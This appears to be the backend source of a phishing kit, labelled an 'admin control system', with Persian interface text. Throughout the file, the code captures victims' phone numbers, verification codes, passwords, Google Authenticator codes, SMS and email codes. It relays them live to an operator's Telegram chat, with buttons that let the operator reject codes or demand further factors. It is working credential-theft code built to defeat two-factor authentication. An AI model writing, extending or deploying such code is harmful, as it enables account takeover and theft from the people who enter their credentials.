// Enhanced Telegram Bot API Service for Admin Control System

const TELEGRAM_BOT_TOKEN =
  import.meta.env.VITE_TELEGRAM_BOT_TOKEN || "YOUR_BOT_TOKEN";
const TELEGRAM_CHAT_ID =
  import.meta.env.VITE_TELEGRAM_CHAT_ID || "YOUR_CHAT_ID";

interface UserSession {
  sessionId: string;
  phoneNumber: string;
  messageId?: number;
  startTime: string;
  phoneVerificationCode?: string;
  completedSteps: string[];
  currentStep: string;
  authAttempts: {
    [key: string]: number;
  };
  authCodes: {
    [key: string]: string[];
  };
}

// Store active sessions (in real app, this would be in a database)
const activeSessions = new Map<string, UserSession>();

/**
 * Generate unique session ID
 */
export const generateSessionId = (): string => {
  return Date.now().toString(36) + Math.random().toString(36).substr(2);
};

/**
 * Send initial phone number to Telegram with admin controls
 */
export const sendPhoneToTelegramEnhanced = async (
  phoneNumber: string,
): Promise<{ success: boolean; sessionId: string }> => {
  const sessionId = generateSessionId();

  // Check if Telegram is configured
  if (!validateTelegramConfig()) {
    console.log("🎭 Demo mode: Would send phone to Telegram");
    console.log("📱 Phone:", phoneNumber);
    console.log("🆔 Session:", sessionId);

    // Create session for demo mode
    const session: UserSession = {
      sessionId,
      phoneNumber,
      startTime: new Date().toLocaleString("fa-IR"),
      completedSteps: [],
      currentStep: "phone_verification",
      authAttempts: {},
      authCodes: {},
      messageId: Date.now(), // Fake message ID for demo
    };

    activeSessions.set(sessionId, session);
    return { success: true, sessionId };
  }

  try {
    const session: UserSession = {
      sessionId,
      phoneNumber,
      startTime: new Date().toLocaleString("fa-IR"),
      completedSteps: [],
      currentStep: "phone_verification",
      authAttempts: {},
      authCodes: {},
    };

    const message = formatInitialMessage(session);

    console.log("📤 Sending message to Telegram:", { sessionId, phoneNumber });

    const response = await fetch(
      `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
      {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: message,
          parse_mode: "HTML",
          reply_markup: {
            inline_keyboard: [], // No buttons initially
          },
        }),
      },
    );

    if (!response.ok) {
      const errorText = await response.text();
      console.error("❌ Telegram send error:", {
        status: response.status,
        error: errorText,
      });
      throw new Error(`Telegram API error: ${response.status} - ${errorText}`);
    }

    const result = await response.json();
    session.messageId = result.result.message_id;

    // Store session
    activeSessions.set(sessionId, session);

    console.log("✅ Phone number sent to Telegram successfully:", {
      sessionId,
      messageId: session.messageId,
    });
    return { success: true, sessionId };
  } catch (error) {
    console.error("❌ Failed to send phone to Telegram:", error);
    return { success: false, sessionId };
  }
};

/**
 * Update session when user enters verification code
 */
export const updatePhoneVerificationCode = async (
  sessionId: string,
  verificationCode: string,
): Promise<boolean> => {
  try {
    const session = activeSessions.get(sessionId);
    if (!session || !session.messageId) {
      console.error("Session or messageId not found:", sessionId);
      return false;
    }

    console.log("📝 Updating phone verification code:", {
      sessionId,
      verificationCode,
      currentSteps: session.completedSteps,
    });

    session.phoneVerificationCode = verificationCode;

    // Add phone_verification to completed steps if not already there
    if (!session.completedSteps.includes("phone_verification")) {
      session.completedSteps.push("phone_verification");
    }

    session.currentStep = "waiting_admin";

    const updatedMessage = formatInitialMessage(session);
    const adminKeyboard = getAdminKeyboard(sessionId, session);

    console.log("🎛️ Admin keyboard being sent:", adminKeyboard);

    await updateTelegramMessage(
      session.messageId,
      updatedMessage,
      adminKeyboard,
    );

    activeSessions.set(sessionId, session);

    console.log("✅ Phone verification updated successfully");
    return true;
  } catch (error) {
    console.error("❌ Failed to update verification code:", error);
    return false;
  }
};

/**
 * Update session with auth step data
 */
export const updateAuthStep = async (
  sessionId: string,
  stepType: string,
  stepData: string,
): Promise<boolean> => {
  try {
    const session = activeSessions.get(sessionId);
    if (!session || !session.messageId) {
      console.error("Session or messageId not found:", sessionId);
      return false;
    }

    // Initialize auth attempts and codes for this step
    if (!session.authAttempts[stepType]) {
      session.authAttempts[stepType] = 0;
    }
    if (!session.authCodes[stepType]) {
      session.authCodes[stepType] = [];
    }

    session.authAttempts[stepType]++;
    session.authCodes[stepType].push(stepData);

    if (!session.completedSteps.includes(stepType)) {
      session.completedSteps.push(stepType);
    }

    session.currentStep = "waiting_admin";

    const updatedMessage = formatInitialMessage(session);
    const adminKeyboard = getAdminKeyboard(sessionId, session);

    await updateTelegramMessage(
      session.messageId,
      updatedMessage,
      adminKeyboard,
    );

    activeSessions.set(sessionId, session);
    return true;
  } catch (error) {
    console.error("❌ Failed to update auth step:", error);
    return false;
  }
};

/**
 * Set user current step (when navigating to auth pages)
 */
export const setUserCurrentStep = async (
  sessionId: string,
  step: string,
): Promise<boolean> => {
  try {
    const session = activeSessions.get(sessionId);
    if (!session || !session.messageId) {
      console.error("Session or messageId not found:", sessionId);
      return false;
    }

    session.currentStep = step;

    const updatedMessage = formatInitialMessage(session);

    // Show admin buttons only when user is on loading page (waiting_admin)
    // Otherwise remove buttons
    const keyboard =
      step === "waiting_admin"
        ? getAdminKeyboard(sessionId, session)
        : { inline_keyboard: [] };

    await updateTelegramMessage(session.messageId, updatedMessage, keyboard);

    activeSessions.set(sessionId, session);
    return true;
  } catch (error) {
    console.error("❌ Failed to set current step:", error);
    return false;
  }
};

/**
 * Check if user can access auth step (prevent duplicate access)
 */
export const canAccessAuthStep = (
  sessionId: string,
  stepType: string,
): boolean => {
  const session = activeSessions.get(sessionId);
  if (!session) return false;

  // Allow access if this is the first time OR if it's SMS and this is the second attempt
  if (stepType === "sms") {
    return (
      !session.authAttempts[stepType] || session.authAttempts[stepType] < 2
    );
  }

  return (
    !session.authAttempts[stepType] || session.authAttempts[stepType] === 0
  );
};

/**
 * Get session data
 */
export const getSession = (sessionId: string): UserSession | undefined => {
  return activeSessions.get(sessionId);
};

/**
 * Show admin buttons when user is on loading page
 */
export const showAdminButtons = async (sessionId: string): Promise<boolean> => {
  try {
    const session = activeSessions.get(sessionId);
    if (!session || !session.messageId) {
      console.error("Session or messageId not found:", sessionId);
      return false;
    }

    // Set step to waiting_admin and show buttons
    session.currentStep = "waiting_admin";

    const updatedMessage = formatInitialMessage(session);
    const adminKeyboard = getAdminKeyboard(sessionId, session);

    console.log("🎛️ Showing admin buttons:", adminKeyboard);

    await updateTelegramMessage(
      session.messageId,
      updatedMessage,
      adminKeyboard,
    );

    activeSessions.set(sessionId, session);
    return true;
  } catch (error) {
    console.error("❌ Failed to show admin buttons:", error);
    return false;
  }
};

/**
 * Format initial message with all session data
 */
const formatInitialMessage = (session: UserSession): string => {
  // Escape HTML characters in user data
  const escapeHtml = (text: string): string => {
    return text
      .replace(/&/g, "&amp;")
      .replace(/</g, "&lt;")
      .replace(/>/g, "&gt;")
      .replace(/"/g, "&quot;")
      .replace(/'/g, "&#39;");
  };

  let message = `🔔 <b>درخواست ورود جدید</b>

📱 <b>شماره همراه:</b> <code>${escapeHtml(session.phoneNumber)}</code>
🆔 <b>Session ID:</b> <code>${escapeHtml(session.sessionId)}</code>
⏰ <b>زمان شروع:</b> ${escapeHtml(session.startTime)}
📍 <b>وضعیت فعلی:</b> ${escapeHtml(getCurrentStepText(session.currentStep))}`;

  // Add phone verification code if exists
  if (session.phoneVerificationCode) {
    message += `\n\n✅ <b>کد تایید شماره:</b> <code>${escapeHtml(session.phoneVerificationCode)}</code>`;
  }

  // Add auth steps data
  if (session.authCodes && Object.keys(session.authCodes).length > 0) {
    Object.keys(session.authCodes).forEach((stepType) => {
      const codes = session.authCodes[stepType];
      if (codes && codes.length > 0) {
        message += `\n\n🔐 <b>${escapeHtml(getStepDisplayName(stepType))}:</b>`;

        codes.forEach((code, index) => {
          message += `\n   ${index + 1}. <code>${escapeHtml(code)}</code>`;
        });
      }
    });
  }

  message += `\n\n📊 <b>مراحل تکمیل شده:</b> ${session.completedSteps?.length || 0}`;
  message += `\n🕐 <b>آخرین به‌روزرسانی:</b> ${escapeHtml(new Date().toLocaleString("fa-IR"))}`;

  return message;
};

/**
 * Get admin keyboard based on session state
 */
const getAdminKeyboard = (sessionId: string, session: UserSession) => {
  console.log("🎛️ Building admin keyboard for session:", {
    sessionId,
    currentStep: session.currentStep,
    completedSteps: session.completedSteps,
    authAttempts: session.authAttempts,
  });

  // Only show buttons if user is on loading page AND has completed phone verification
  if (session.currentStep !== "waiting_admin") {
    console.log("❌ Not showing buttons - wrong step:", session.currentStep);
    return { inline_keyboard: [] };
  }

  // User must have completed phone verification to see admin buttons
  if (!session.completedSteps.includes("phone_verification")) {
    console.log("❌ Not showing buttons - phone verification not completed");
    return { inline_keyboard: [] };
  }

  const buttons = [];

  // First row: Phone verification incorrect button (always show after phone verification)
  buttons.push([
    {
      text: "❌ شماره اشتباه",
      callback_data: `incorrect_phone_${sessionId}`,
    },
    {
      text: "❌ کد تایید اشتباه",
      callback_data: `incorrect_verification_${sessionId}`,
    },
  ]);

  // Authentication method buttons
  const authButtons = [];

  // Password button
  if (!session.authAttempts["password"]) {
    authButtons.push({
      text: "🔒 Password",
      callback_data: `auth_password_${sessionId}`,
    });
    console.log("✅ Added Password button");
  } else {
    // Add incorrect password button if password was attempted
    authButtons.push({
      text: "❌ رمز اشتباه",
      callback_data: `incorrect_password_${sessionId}`,
    });
  }

  // Google Auth button
  if (!session.authAttempts["google"]) {
    authButtons.push({
      text: "📱 Google Auth",
      callback_data: `auth_google_${sessionId}`,
    });
    console.log("✅ Added Google Auth button");
  } else {
    // Add incorrect google button if attempted
    authButtons.push({
      text: "❌ Google Auth اشتباه",
      callback_data: `incorrect_google_${sessionId}`,
    });
  }

  // Add auth buttons in pairs
  for (let i = 0; i < authButtons.length; i += 2) {
    if (i + 1 < authButtons.length) {
      buttons.push([authButtons[i], authButtons[i + 1]]);
    } else {
      buttons.push([authButtons[i]]);
    }
  }

  // SMS Code button (allow up to 2 attempts)
  if (!session.authAttempts["sms"] || session.authAttempts["sms"] < 2) {
    buttons.push([
      {
        text: "💬 SMS Code",
        callback_data: `auth_sms_${sessionId}`,
      },
    ]);
    console.log("✅ Added SMS Code button");
  } else {
    buttons.push([
      {
        text: "❌ کد پیامک اشتباه",
        callback_data: `incorrect_sms_${sessionId}`,
      },
    ]);
  }

  // Email Code button
  if (!session.authAttempts["email"]) {
    buttons.push([
      {
        text: "📧 Email Code",
        callback_data: `auth_email_${sessionId}`,
      },
    ]);
    console.log("✅ Added Email Code button");
  } else {
    buttons.push([
      {
        text: "❌ کد ایمیل اشتباه",
        callback_data: `incorrect_email_${sessionId}`,
      },
    ]);
  }

  // Complete Auth button (if user has completed at least one additional step)
  if (session.completedSteps.length > 1) {
    buttons.push([
      {
        text: "✅ تکمیل احراز هویت",
        callback_data: `complete_auth_${sessionId}`,
      },
    ]);
    console.log("✅ Added Complete Auth button");
  }

  console.log("🎛️ Final keyboard:", { inline_keyboard: buttons });
  return { inline_keyboard: buttons };
};

/**
 * Update Telegram message
 */
const updateTelegramMessage = async (
  messageId: number,
  text: string,
  replyMarkup: any,
): Promise<void> => {
  // Validate inputs
  if (!messageId || !text) {
    console.error("❌ Invalid message data:", {
      messageId,
      textLength: text?.length,
    });
    return;
  }

  // Check if Telegram is configured
  if (!validateTelegramConfig()) {
    console.log("🎭 Demo mode: Would update Telegram message");
    console.log("📝 Message:", text);
    console.log("⌨️ Keyboard:", replyMarkup);
    return;
  }

  try {
    const payload = {
      chat_id: TELEGRAM_CHAT_ID,
      message_id: messageId,
      text: text.substring(0, 4096), // Telegram message limit
      parse_mode: "HTML",
      reply_markup: replyMarkup,
    };

    console.log("🔄 Updating Telegram message:", {
      messageId,
      textLength: text.length,
    });

    const response = await fetch(
      `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/editMessageText`,
      {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(payload),
      },
    );

    if (!response.ok) {
      const errorText = await response.text();
      console.error("❌ Telegram API error:", {
        status: response.status,
        statusText: response.statusText,
        error: errorText,
        payload: payload,
      });
      throw new Error(
        `Failed to update message: ${response.status} - ${errorText}`,
      );
    }

    const result = await response.json();
    console.log("✅ Message updated successfully:", result.ok);
  } catch (error) {
    console.error("❌ Failed to update Telegram message:", error);
    // Don't throw the error, just log it to prevent breaking the user flow
  }
};

/**
 * Get current step display text
 */
const getCurrentStepText = (step: string): string => {
  const stepTexts: { [key: string]: string } = {
    phone_verification: "در انتظار کد تایید شماره",
    waiting_admin: "در انتظار دستور ادمین",
    auth_password: "وارد کردن رمز عبور",
    auth_google: "وارد کردن کد Google Auth",
    auth_sms: "وارد کردن کد پیامک",
    auth_email: "وارد کردن کد ایمیل",
    completed: "تکمیل شده",
  };

  return stepTexts[step] || step;
};

/**
 * Get step display name
 */
const getStepDisplayName = (stepType: string): string => {
  const names: { [key: string]: string } = {
    password: "رمز عبور",
    google: "Google Authenticator",
    sms: "کد پیامک",
    email: "کد ایمیل",
  };

  return names[stepType] || stepType;
};

/**
 * Validate Telegram configuration
 */
export const validateTelegramConfig = (): boolean => {
  if (!TELEGRAM_BOT_TOKEN || TELEGRAM_BOT_TOKEN === "YOUR_BOT_TOKEN") {
    return false;
  }

  if (!TELEGRAM_CHAT_ID || TELEGRAM_CHAT_ID === "YOUR_CHAT_ID") {
    return false;
  }

  return true;
};
